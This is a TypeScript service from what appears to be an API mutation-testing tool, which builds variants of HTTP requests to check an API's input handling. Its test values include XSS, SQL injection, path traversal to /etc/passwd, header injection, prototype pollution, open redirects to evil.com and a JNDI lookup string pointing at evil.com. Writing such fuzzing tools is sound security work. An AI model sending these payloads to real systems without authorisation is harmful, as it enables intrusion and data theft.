import { Injectable } from '@nestjs/common';
import { HttpRequest, Mutation, MutationType, HttpMethod } from '@api-mutation-tester/shared';
import { v4 as uuidv4 } from 'uuid';

@Injectable()
export class MutationGeneratorService {
  private mutationCounter = 0;

  /**
   * Generate all mutations for a given HTTP request
   */
  generateMutations(originalRequest: HttpRequest): Mutation[] {
    this.mutationCounter = 0;
    const mutations: Mutation[] = [];

    // Generate mutations based on HTTP method
    if (originalRequest.method === 'GET') {
      // For GET requests, generate mutations for URL parameters and headers
      mutations.push(...this.generateUrlMutations(originalRequest));
      mutations.push(...this.generateHeaderMutations(originalRequest));
    } else {
      // For other methods, generate payload mutations if payload exists
      if (originalRequest.payload) {
        mutations.push(...this.generatePayloadMutations(originalRequest));
      }
      // Also generate header mutations for non-GET methods
      mutations.push(...this.generateHeaderMutations(originalRequest));
    }

    return mutations;
  }

  /**
   * Get mutation categories with descriptions
   */
  getMutationCategories(): Record<string, { name: string; description: string; types: MutationType[] }> {
    return {
      string_mutations: {
        name: 'String Mutations',
        description: 'Test string field handling with various string values',
        types: [MutationType.STRING_EMPTY, MutationType.STRING_LONG, MutationType.STRING_MALICIOUS]
      },
      type_mutations: {
        name: 'Type Mutations',
        description: 'Test type validation by changing data types',
        types: [MutationType.TYPE_BOOLEAN, MutationType.TYPE_ARRAY, MutationType.TYPE_NULL, MutationType.TYPE_UNDEFINED]
      },
      numeric_mutations: {
        name: 'Numeric Mutations',
        description: 'Test numeric field handling with edge case numbers',
        types: [MutationType.NUMERIC_LARGE, MutationType.NUMERIC_NEGATIVE, MutationType.NUMERIC_ZERO]
      },
      character_mutations: {
        name: 'Character Mutations',
        description: 'Test special character and encoding handling',
        types: [MutationType.SPECIAL_CHARACTERS, MutationType.UNICODE_CHARACTERS]
      },
      structure_mutations: {
        name: 'Structure Mutations',
        description: 'Test object structure validation',
        types: [MutationType.MISSING_FIELD, MutationType.EXTRA_FIELD, MutationType.INVALID_TYPE]
      }
    };
  }

  /**
   * Get detailed description for a mutation type
   */
  getMutationTypeDescription(type: MutationType): { name: string; description: string; purpose: string } {
    const descriptions = {
      [MutationType.STRING_EMPTY]: {
        name: 'Empty String',
        description: 'Replace field with empty string',
        purpose: 'Test required field validation and empty string handling'
      },
      [MutationType.STRING_LONG]: {
        name: 'Long String',
        description: 'Replace field with very long string (>10000 chars)',
        purpose: 'Test buffer overflow protection and length validation'
      },
      [MutationType.STRING_MALICIOUS]: {
        name: 'Malicious Script',
        description: 'Replace field with potentially malicious scripts',
        purpose: 'Test XSS protection and script injection prevention'
      },
      [MutationType.TYPE_BOOLEAN]: {
        name: 'Boolean Type',
        description: 'Replace field with boolean values',
        purpose: 'Test type validation and boolean handling'
      },
      [MutationType.TYPE_ARRAY]: {
        name: 'Array Type',
        description: 'Replace field with array values',
        purpose: 'Test type validation and array handling'
      },
      [MutationType.TYPE_NULL]: {
        name: 'Null Value',
        description: 'Replace field with null',
        purpose: 'Test null value handling and validation'
      },
      [MutationType.TYPE_UNDEFINED]: {
        name: 'Undefined Value',
        description: 'Replace field with undefined',
        purpose: 'Test undefined value handling'
      },
      [MutationType.NUMERIC_LARGE]: {
        name: 'Large Number',
        description: 'Replace field with very large numbers',
        purpose: 'Test numeric overflow protection and range validation'
      },
      [MutationType.NUMERIC_NEGATIVE]: {
        name: 'Negative Number',
        description: 'Replace field with negative numbers',
        purpose: 'Test negative number handling and validation'
      },
      [MutationType.NUMERIC_ZERO]: {
        name: 'Zero Value',
        description: 'Replace field with zero',
        purpose: 'Test zero value handling and edge cases'
      },
      [MutationType.SPECIAL_CHARACTERS]: {
        name: 'Special Characters',
        description: 'Replace field with special characters and symbols',
        purpose: 'Test special character handling and injection prevention'
      },
      [MutationType.UNICODE_CHARACTERS]: {
        name: 'Unicode Characters',
        description: 'Replace field with Unicode characters',
        purpose: 'Test Unicode handling and encoding issues'
      },
      [MutationType.MISSING_FIELD]: {
        name: 'Missing Field',
        description: 'Remove field from request',
        purpose: 'Test required field validation'
      },
      [MutationType.EXTRA_FIELD]: {
        name: 'Extra Field',
        description: 'Add unexpected field to request',
        purpose: 'Test input validation and field filtering'
      },
      [MutationType.INVALID_TYPE]: {
        name: 'Invalid Type',
        description: 'Replace field with unexpected data type',
        purpose: 'Test type validation and error handling'
      }
    };

    return descriptions[type] || {
      name: 'Unknown Mutation',
      description: 'Unknown mutation type',
      purpose: 'Unknown purpose'
    };
  }

  /**
   * Generate a unique mutation ID
   */
  private generateMutationId(type: MutationType, fieldName?: string): string {
    this.mutationCounter++;
    const timestamp = Date.now();
    const typePrefix = type.toLowerCase().replace(/_/g, '-');
    const fieldSuffix = fieldName ? `-${fieldName}` : '';
    return `mut-${typePrefix}${fieldSuffix}-${this.mutationCounter}-${timestamp}`;
  }

  /**
   * Get mutation statistics for a set of mutations
   */
  getMutationStatistics(mutations: Mutation[]): {
    total: number;
    byType: Record<MutationType, number>;
    byCategory: Record<string, number>;
  } {
    const byType: Record<MutationType, number> = {} as Record<MutationType, number>;
    const byCategory: Record<string, number> = {};
    const categories = this.getMutationCategories();

    // Initialize counters
    Object.values(MutationType).forEach(type => {
      byType[type as MutationType] = 0;
    });

    Object.keys(categories).forEach(category => {
      byCategory[category] = 0;
    });

    // Count mutations
    mutations.forEach(mutation => {
      byType[mutation.type]++;
      
      // Find category for this mutation type
      for (const [categoryKey, categoryInfo] of Object.entries(categories)) {
        if (categoryInfo.types.includes(mutation.type)) {
          byCategory[categoryKey]++;
          break;
        }
      }
    });

    return {
      total: mutations.length,
      byType,
      byCategory
    };
  }

  /**
   * Get documentation for all mutation strategies
   */
  getMutationDocumentation(): {
    overview: string;
    categories: Record<string, { name: string; description: string; types: MutationType[] }>;
    types: Record<MutationType, { name: string; description: string; purpose: string }>;
  } {
    const typeDescriptions: Record<MutationType, { name: string; description: string; purpose: string }> = {} as any;
    
    Object.values(MutationType).forEach(type => {
      typeDescriptions[type as MutationType] = this.getMutationTypeDescription(type as MutationType);
    });

    return {
      overview: 'API Mutation Testing generates various mutations of the original request to test API robustness, security, and error handling. Each mutation targets specific vulnerability types or edge cases.',
      categories: this.getMutationCategories(),
      types: typeDescriptions
    };
  }

  /**
   * Generate mutations for URL parameters (for GET requests)
   */
  private generateUrlMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    
    try {
      const url = new URL(originalRequest.url);
      const searchParams = url.searchParams;
      
      // If there are query parameters, mutate them
      if (searchParams.toString()) {
        searchParams.forEach((value, key) => {
          mutations.push(...this.generateQueryParameterMutations(originalRequest, key, value));
        });
      }
      
      // Generate mutations for path parameters (if URL has path segments)
      mutations.push(...this.generatePathMutations(originalRequest));
      
      // If no query parameters exist, generate some common parameter injection attempts
      if (!searchParams.toString()) {
        mutations.push(...this.generateParameterInjectionMutations(originalRequest));
      }
      
    } catch (error) {
      // If URL parsing fails, generate basic mutations
      mutations.push(...this.generateBasicUrlMutations(originalRequest));
    }
    
    return mutations;
  }

  /**
   * Generate mutations for HTTP headers
   */
  private generateHeaderMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    
    // Mutate existing headers
    Object.entries(originalRequest.headers).forEach(([headerName, headerValue]) => {
      mutations.push(...this.generateHeaderValueMutations(originalRequest, headerName, headerValue));
    });
    
    // Add malicious headers
    mutations.push(...this.generateMaliciousHeaderMutations(originalRequest));
    
    return mutations;
  }

  /**
   * Generate mutations for query parameters
   */
  private generateQueryParameterMutations(originalRequest: HttpRequest, paramName: string, paramValue: string): Mutation[] {
    const mutations: Mutation[] = [];
    
    // String mutations for parameter values
    const testValues = [
      '', // Empty value
      'A'.repeat(10000), // Long string
      '<script>alert(1)</script>', // XSS
      '\'; DROP TABLE users; --', // SQL injection
      '../../../etc/passwd', // Path traversal
      '%00', // Null byte
      '${7*7}', // Template injection
      'admin', // Privilege escalation
      '999999999999999999999', // Large number
      '-1', // Negative number
      'true', // Boolean
      'false', // Boolean
      'null', // Null string
      'undefined', // Undefined string
    ];
    
    testValues.forEach(testValue => {
      const url = new URL(originalRequest.url);
      url.searchParams.set(paramName, testValue);
      
      const modifiedRequest: HttpRequest = {
        ...originalRequest,
        url: url.toString()
      };
      
      mutations.push({
        id: this.generateMutationId(MutationType.STRING_MALICIOUS, paramName),
        type: MutationType.STRING_MALICIOUS,
        description: `Query parameter mutation: ${paramName}=${testValue.substring(0, 50)}${testValue.length > 50 ? '...' : ''}`,
        modifiedRequest,
        originalField: paramName,
        mutationStrategy: `Mutate query parameter to test input validation and injection vulnerabilities`
      });
    });
    
    // Remove parameter (test required parameter validation)
    const urlWithoutParam = new URL(originalRequest.url);
    urlWithoutParam.searchParams.delete(paramName);
    
    mutations.push({
      id: this.generateMutationId(MutationType.MISSING_FIELD, paramName),
      type: MutationType.MISSING_FIELD,
      description: `Missing query parameter: ${paramName}`,
      modifiedRequest: {
        ...originalRequest,
        url: urlWithoutParam.toString()
      },
      originalField: paramName,
      mutationStrategy: `Remove query parameter to test required parameter validation`
    });
    
    return mutations;
  }

  /**
   * Generate mutations for URL path segments
   */
  private generatePathMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    
    try {
      const url = new URL(originalRequest.url);
      const pathSegments = url.pathname.split('/').filter(segment => segment.length > 0);
      
      // Path traversal mutations
      const pathTraversalPayloads = [
        '../',
        '..\\',
        '../../',
        '../../../etc/passwd',
        '..%2F',
        '..%5C',
        '%2e%2e%2f',
        '%2e%2e%5c',
      ];
      
      pathTraversalPayloads.forEach(payload => {
        const modifiedPath = url.pathname + payload;
        const modifiedUrl = new URL(originalRequest.url);
        modifiedUrl.pathname = modifiedPath;
        
        mutations.push({
          id: this.generateMutationId(MutationType.STRING_MALICIOUS, 'path'),
          type: MutationType.STRING_MALICIOUS,
          description: `Path traversal attempt: ${payload}`,
          modifiedRequest: {
            ...originalRequest,
            url: modifiedUrl.toString()
          },
          originalField: 'path',
          mutationStrategy: `Test path traversal vulnerability`
        });
      });
      
      // If there are numeric path segments, test with different values
      pathSegments.forEach((segment, index) => {
        if (/^\d+$/.test(segment)) {
          const testValues = ['0', '-1', '999999999', 'abc', 'null', 'undefined'];
          
          testValues.forEach(testValue => {
            const newSegments = [...pathSegments];
            newSegments[index] = testValue;
            const newPath = '/' + newSegments.join('/');
            
            const modifiedUrl = new URL(originalRequest.url);
            modifiedUrl.pathname = newPath;
            
            mutations.push({
              id: this.generateMutationId(MutationType.INVALID_TYPE, `path_segment_${index}`),
              type: MutationType.INVALID_TYPE,
              description: `Path segment mutation: ${segment} → ${testValue}`,
              modifiedRequest: {
                ...originalRequest,
                url: modifiedUrl.toString()
              },
              originalField: `path_segment_${index}`,
              mutationStrategy: `Test path parameter validation`
            });
          });
        }
      });
      
    } catch (error) {
      // URL parsing failed, skip path mutations
    }
    
    return mutations;
  }

  /**
   * Generate parameter injection mutations for URLs without existing parameters
   */
  private generateParameterInjectionMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    
    const injectionParams = [
      { name: 'debug', value: 'true' },
      { name: 'admin', value: '1' },
      { name: 'test', value: '1' },
      { name: 'id', value: '1\' OR \'1\'=\'1' },
      { name: 'callback', value: 'alert(1)' },
      { name: 'redirect', value: 'http://evil.com' },
      { name: 'url', value: 'javascript:alert(1)' },
      { name: 'file', value: '../../../etc/passwd' },
    ];
    
    injectionParams.forEach(({ name, value }) => {
      const url = new URL(originalRequest.url);
      url.searchParams.set(name, value);
      
      mutations.push({
        id: this.generateMutationId(MutationType.EXTRA_FIELD, name),
        type: MutationType.EXTRA_FIELD,
        description: `Parameter injection: ${name}=${value}`,
        modifiedRequest: {
          ...originalRequest,
          url: url.toString()
        },
        originalField: name,
        mutationStrategy: `Inject parameter to test for hidden functionality or vulnerabilities`
      });
    });
    
    return mutations;
  }

  /**
   * Generate basic URL mutations when URL parsing fails
   */
  private generateBasicUrlMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    
    const urlSuffixes = [
      '?debug=true',
      '?admin=1',
      '/../',
      '/..%2F',
      '?callback=alert(1)',
      '?redirect=http://evil.com',
    ];
    
    urlSuffixes.forEach(suffix => {
      mutations.push({
        id: this.generateMutationId(MutationType.STRING_MALICIOUS, 'url'),
        type: MutationType.STRING_MALICIOUS,
        description: `URL suffix injection: ${suffix}`,
        modifiedRequest: {
          ...originalRequest,
          url: originalRequest.url + suffix
        },
        originalField: 'url',
        mutationStrategy: `Test URL manipulation vulnerabilities`
      });
    });
    
    return mutations;
  }

  /**
   * Generate mutations for header values
   */
  private generateHeaderValueMutations(originalRequest: HttpRequest, headerName: string, headerValue: string): Mutation[] {
    const mutations: Mutation[] = [];
    
    const testValues = [
      '', // Empty header
      'A'.repeat(10000), // Long header
      '<script>alert(1)</script>', // XSS in header
      '\r\nSet-Cookie: admin=true', // Header injection
      '\n\rLocation: http://evil.com', // Header injection
      '../../../etc/passwd', // Path traversal
      '${7*7}', // Template injection
    ];
    
    testValues.forEach(testValue => {
      const modifiedHeaders = {
        ...originalRequest.headers,
        [headerName]: testValue
      };
      
      mutations.push({
        id: this.generateMutationId(MutationType.STRING_MALICIOUS, headerName),
        type: MutationType.STRING_MALICIOUS,
        description: `Header mutation: ${headerName}=${testValue.substring(0, 50)}${testValue.length > 50 ? '...' : ''}`,
        modifiedRequest: {
          ...originalRequest,
          headers: modifiedHeaders
        },
        originalField: headerName,
        mutationStrategy: `Test header injection and validation vulnerabilities`
      });
    });
    
    return mutations;
  }

  /**
   * Generate malicious header mutations
   */
  private generateMaliciousHeaderMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    
    const maliciousHeaders = [
      { name: 'X-Forwarded-For', value: '127.0.0.1' },
      { name: 'X-Real-IP', value: '127.0.0.1' },
      { name: 'X-Originating-IP', value: '127.0.0.1' },
      { name: 'X-Remote-IP', value: '127.0.0.1' },
      { name: 'X-Client-IP', value: '127.0.0.1' },
      { name: 'Host', value: 'evil.com' },
      { name: 'Referer', value: 'http://evil.com' },
      { name: 'User-Agent', value: '<script>alert(1)</script>' },
      { name: 'X-Forwarded-Host', value: 'evil.com' },
      { name: 'X-Forwarded-Proto', value: 'javascript' },
      { name: 'Origin', value: 'http://evil.com' },
      { name: 'X-Requested-With', value: 'XMLHttpRequest' },
      { name: 'Content-Length', value: '-1' },
      { name: 'Transfer-Encoding', value: 'chunked' },
    ];
    
    maliciousHeaders.forEach(({ name, value }) => {
      const modifiedHeaders = {
        ...originalRequest.headers,
        [name]: value
      };
      
      mutations.push({
        id: this.generateMutationId(MutationType.EXTRA_FIELD, name),
        type: MutationType.EXTRA_FIELD,
        description: `Malicious header injection: ${name}=${value}`,
        modifiedRequest: {
          ...originalRequest,
          headers: modifiedHeaders
        },
        originalField: name,
        mutationStrategy: `Test for header-based vulnerabilities and bypasses`
      });
    });
    
    return mutations;
  }

  /**
   * Generate mutations for the request payload
   */
  private generatePayloadMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    const payload = originalRequest.payload;

    if (typeof payload === 'object' && payload !== null) {
      // Generate mutations for each field in the object
      for (const [key, value] of Object.entries(payload)) {
        mutations.push(...this.generateFieldMutations(originalRequest, key, value));
      }

      // Generate structure mutations
      mutations.push(...this.generateStructureMutations(originalRequest));
    }

    return mutations;
  }

  /**
   * Generate mutations for a specific field
   */
  private generateFieldMutations(originalRequest: HttpRequest, fieldName: string, originalValue: any): Mutation[] {
    const mutations: Mutation[] = [];

    // String mutations
    mutations.push(...this.generateStringMutations(originalRequest, fieldName, originalValue));
    
    // Type mutations
    mutations.push(...this.generateTypeMutations(originalRequest, fieldName, originalValue));

    // Numeric mutations
    mutations.push(...this.generateNumericMutations(originalRequest, fieldName, originalValue));

    // Special character mutations
    mutations.push(...this.generateSpecialCharacterMutations(originalRequest, fieldName, originalValue));

    // Nested object/array mutations
    mutations.push(...this.generateNestedMutations(originalRequest, fieldName, originalValue));

    return mutations;
  }

  /**
   * Generate string-based mutations
   */
  private generateStringMutations(originalRequest: HttpRequest, fieldName: string, originalValue: any): Mutation[] {
    const mutations: Mutation[] = [];

    // Empty string mutation
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      '',
      MutationType.STRING_EMPTY,
      'Empty string value',
      'Replace field with empty string'
    ));

    // Long string mutation (>10000 characters)
    const longString = 'A'.repeat(10001);
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      longString,
      MutationType.STRING_LONG,
      'Very long string (10001 characters)',
      'Replace field with extremely long string to test buffer overflow'
    ));

    // Malicious script mutations
    const maliciousScripts = [
      'alert(1)',
      '<script>alert(1)</script>',
      'javascript:alert(1)',
      '"><script>alert(1)</script>',
      '\'; DROP TABLE users; --',
      '${7*7}',
      '{{7*7}}',
      '<img src=x onerror=alert(1)>',
      'eval("alert(1)")'
    ];

    maliciousScripts.forEach((script, index) => {
      mutations.push(this.createMutation(
        originalRequest,
        fieldName,
        script,
        MutationType.STRING_MALICIOUS,
        `Malicious script injection: ${script}`,
        `Inject malicious script to test XSS/injection vulnerabilities`
      ));
    });

    return mutations;
  }

  /**
   * Generate type-based mutations
   */
  private generateTypeMutations(originalRequest: HttpRequest, fieldName: string, originalValue: any): Mutation[] {
    const mutations: Mutation[] = [];

    // Boolean mutations
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      true,
      MutationType.TYPE_BOOLEAN,
      'Boolean true value',
      'Replace field with boolean true'
    ));

    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      false,
      MutationType.TYPE_BOOLEAN,
      'Boolean false value',
      'Replace field with boolean false'
    ));

    // Array mutation
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      [originalValue],
      MutationType.TYPE_ARRAY,
      'Array containing original value',
      'Replace field with array containing the original value'
    ));

    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      [],
      MutationType.TYPE_ARRAY,
      'Empty array',
      'Replace field with empty array'
    ));

    // Null mutation
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      null,
      MutationType.TYPE_NULL,
      'Null value',
      'Replace field with null'
    ));

    // Undefined mutation
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      undefined,
      MutationType.TYPE_UNDEFINED,
      'Undefined value',
      'Replace field with undefined'
    ));

    return mutations;
  }

  /**
   * Generate structure-based mutations (missing fields, extra fields)
   */
  private generateStructureMutations(originalRequest: HttpRequest): Mutation[] {
    const mutations: Mutation[] = [];
    const payload = originalRequest.payload;

    if (typeof payload === 'object' && payload !== null) {
      const fields = Object.keys(payload);

      // Missing field mutations - remove each field one by one
      fields.forEach(fieldName => {
        const modifiedPayload = { ...payload };
        delete modifiedPayload[fieldName];

        const modifiedRequest: HttpRequest = {
          ...originalRequest,
          payload: modifiedPayload
        };

        const typeInfo = this.getMutationTypeDescription(MutationType.MISSING_FIELD);
        mutations.push({
          id: this.generateMutationId(MutationType.MISSING_FIELD, fieldName),
          type: MutationType.MISSING_FIELD,
          description: `${typeInfo.name}: Missing required field: ${fieldName}`,
          modifiedRequest,
          originalField: fieldName,
          mutationStrategy: `Remove field to test validation | ${typeInfo.purpose}`
        });
      });

      // Extra field mutations - add unexpected fields
      const extraFields = [
        { name: 'extraField', value: 'unexpected' },
        { name: 'admin', value: true },
        { name: 'role', value: 'admin' },
        { name: 'debug', value: true },
        { name: '__proto__', value: { isAdmin: true } },
        { name: 'constructor', value: { prototype: { isAdmin: true } } }
      ];

      extraFields.forEach(({ name, value }) => {
        const modifiedPayload = {
          ...payload,
          [name]: value
        };

        const modifiedRequest: HttpRequest = {
          ...originalRequest,
          payload: modifiedPayload
        };

        const typeInfo = this.getMutationTypeDescription(MutationType.EXTRA_FIELD);
        mutations.push({
          id: this.generateMutationId(MutationType.EXTRA_FIELD, name),
          type: MutationType.EXTRA_FIELD,
          description: `${typeInfo.name}: Extra field added: ${name} = ${JSON.stringify(value)}`,
          modifiedRequest,
          originalField: name,
          mutationStrategy: `Add unexpected field to test input validation | ${typeInfo.purpose}`
        });
      });
    }

    return mutations;
  }

  /**
   * Generate numeric mutations
   */
  private generateNumericMutations(originalRequest: HttpRequest, fieldName: string, originalValue: any): Mutation[] {
    const mutations: Mutation[] = [];

    // Large positive number
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      Number.MAX_SAFE_INTEGER,
      MutationType.NUMERIC_LARGE,
      `Large positive number: ${Number.MAX_SAFE_INTEGER}`,
      'Test with maximum safe integer value'
    ));

    // Very large number (beyond safe integer)
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      9007199254740992, // Number.MAX_SAFE_INTEGER + 1
      MutationType.NUMERIC_LARGE,
      'Number beyond safe integer range',
      'Test with number beyond JavaScript safe integer range'
    ));

    // Large negative number
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      Number.MIN_SAFE_INTEGER,
      MutationType.NUMERIC_NEGATIVE,
      `Large negative number: ${Number.MIN_SAFE_INTEGER}`,
      'Test with minimum safe integer value'
    ));

    // Negative number
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      -1,
      MutationType.NUMERIC_NEGATIVE,
      'Negative number: -1',
      'Test with simple negative number'
    ));

    // Zero
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      0,
      MutationType.NUMERIC_ZERO,
      'Zero value',
      'Test with zero value'
    ));

    // Floating point edge cases
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      Infinity,
      MutationType.NUMERIC_LARGE,
      'Positive infinity',
      'Test with positive infinity'
    ));

    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      -Infinity,
      MutationType.NUMERIC_NEGATIVE,
      'Negative infinity',
      'Test with negative infinity'
    ));

    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      NaN,
      MutationType.NUMERIC_LARGE,
      'Not a Number (NaN)',
      'Test with NaN value'
    ));

    return mutations;
  }

  /**
   * Generate special character and Unicode mutations
   */
  private generateSpecialCharacterMutations(originalRequest: HttpRequest, fieldName: string, originalValue: any): Mutation[] {
    const mutations: Mutation[] = [];

    const specialCharacters = [
      '!@#$%^&*()_+-=[]{}|;:,.<>?',
      '`~',
      '\n\r\t',
      '\\',
      '"\'',
      '/../../../etc/passwd',
      '%00',
      '%0A%0D',
      '${jndi:ldap://evil.com/a}',
      '../',
      '..\\',
      'CON', 'PRN', 'AUX', 'NUL', // Windows reserved names
      'SELECT * FROM users',
      'DROP TABLE users',
      'UNION SELECT password FROM users'
    ];

    specialCharacters.forEach((chars, index) => {
      mutations.push(this.createMutation(
        originalRequest,
        fieldName,
        chars,
        MutationType.SPECIAL_CHARACTERS,
        `Special characters: ${chars.substring(0, 50)}${chars.length > 50 ? '...' : ''}`,
        'Test with special characters for injection vulnerabilities'
      ));
    });

    // Unicode mutations
    const unicodeStrings = [
      '🚀🔥💯', // Emojis
      'Ω≈ç√∫˜µ≤≥÷', // Mathematical symbols
      'ÀÁÂÃÄÅàáâãäå', // Accented characters
      '中文测试', // Chinese characters
      'العربية', // Arabic
      'עברית', // Hebrew
      'Русский', // Cyrillic
      '日本語', // Japanese
      '\u0000\u0001\u0002', // Control characters
      '\uFEFF', // Byte order mark
      '\u200B\u200C\u200D', // Zero-width characters
      'test\u0000null', // Null byte injection
      '\uD83D\uDE00', // Surrogate pairs
      '\uFFFD', // Replacement character
      '\u2028\u2029' // Line/paragraph separators
    ];

    unicodeStrings.forEach((unicode, index) => {
      mutations.push(this.createMutation(
        originalRequest,
        fieldName,
        unicode,
        MutationType.UNICODE_CHARACTERS,
        `Unicode string: ${unicode}`,
        'Test with Unicode characters for encoding issues'
      ));
    });

    return mutations;
  }

  /**
   * Generate nested object and array mutations
   */
  private generateNestedMutations(originalRequest: HttpRequest, fieldName: string, originalValue: any): Mutation[] {
    const mutations: Mutation[] = [];

    // Deep nested object
    const deepObject = this.createDeeplyNestedObject(10);
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      deepObject,
      MutationType.INVALID_TYPE,
      'Deeply nested object (10 levels)',
      'Test with deeply nested object structure'
    ));

    // Circular reference object (will be converted to string representation)
    const circularObj: any = { name: 'test' };
    circularObj.self = circularObj;
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      '[Circular Reference]',
      MutationType.INVALID_TYPE,
      'Circular reference object',
      'Test with circular reference structure'
    ));

    // Large array
    const largeArray = new Array(1000).fill('item');
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      largeArray,
      MutationType.TYPE_ARRAY,
      'Large array (1000 items)',
      'Test with large array to check memory/performance limits'
    ));

    // Nested array with mixed types
    const mixedArray = [
      'string',
      123,
      true,
      null,
      undefined,
      { nested: 'object' },
      ['nested', 'array'],
      () => 'function'
    ];
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      mixedArray,
      MutationType.TYPE_ARRAY,
      'Mixed type array',
      'Test with array containing different data types'
    ));

    // Object with prototype pollution attempt
    const prototypePayload = {
      '__proto__': { isAdmin: true },
      'constructor': { prototype: { isAdmin: true } }
    };
    mutations.push(this.createMutation(
      originalRequest,
      fieldName,
      prototypePayload,
      MutationType.INVALID_TYPE,
      'Prototype pollution attempt',
      'Test for prototype pollution vulnerabilities'
    ));

    return mutations;
  }

  /**
   * Helper method to create deeply nested object
   */
  private createDeeplyNestedObject(depth: number): any {
    if (depth <= 0) {
      return 'deep_value';
    }
    return {
      level: depth,
      nested: this.createDeeplyNestedObject(depth - 1)
    };
  }

  /**
   * Helper method to create a mutation object
   */
  private createMutation(
    originalRequest: HttpRequest,
    fieldName: string,
    newValue: any,
    type: MutationType,
    description: string,
    strategy: string
  ): Mutation {
    const modifiedPayload = {
      ...originalRequest.payload,
      [fieldName]: newValue
    };

    const modifiedRequest: HttpRequest = {
      ...originalRequest,
      payload: modifiedPayload
    };

    const typeInfo = this.getMutationTypeDescription(type);
    const enhancedDescription = `${typeInfo.name}: ${description}`;

    return {
      id: this.generateMutationId(type, fieldName),
      type,
      description: enhancedDescription,
      modifiedRequest,
      originalField: fieldName,
      mutationStrategy: `${strategy} | ${typeInfo.purpose}`
    };
  }
}